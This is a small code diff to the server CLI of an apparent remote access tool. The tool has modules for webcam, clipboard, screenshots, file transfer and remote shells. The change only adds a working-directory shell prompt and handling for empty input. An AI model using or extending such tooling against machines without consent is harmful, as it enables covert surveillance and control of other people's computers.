@@ -5,7 +5,8 @@ import socket
 from contextlib import suppress
 
 from cryptography.hazmat.primitives.asymmetric import ec
-from modules import clipboard, download, filetransfer, screenshot, shells, tasks, webcam, windows
+from modules import (clipboard, download, filetransfer, screenshot,
+                     shells, tasks, webcam, windows, helpers)
 from modules.baseserver import BaseServer
 from utils import terminal
 from utils.timeout_handler import timeoutsetter
@@ -134,9 +135,15 @@ class ServerCLI(BaseServer, cmd.Cmd):
         """ Open a shell to client """
         if self.__check_select(): return
 
+        # Fetch current working directory
+        cwd = helpers.getcwd(self.client)
+
+        # Generate client platform specific prompt
+        prompt = terminal.make_prompt(self.client, cwd)
+
         logging.debug('Launched shell (%s)', self.client.id)
         while True:
-            command = input('shell> ')
+            command = input(prompt)
 
             # Check for cases where command only affects output visually
             match command.strip():
@@ -144,6 +151,8 @@ class ServerCLI(BaseServer, cmd.Cmd):
                     break
                 case 'clear' | 'cls':
                     terminal.clear()
+                    continue
+                case '':
                     continue
 
             # Check if the directory is changed, in which case it should be remembered
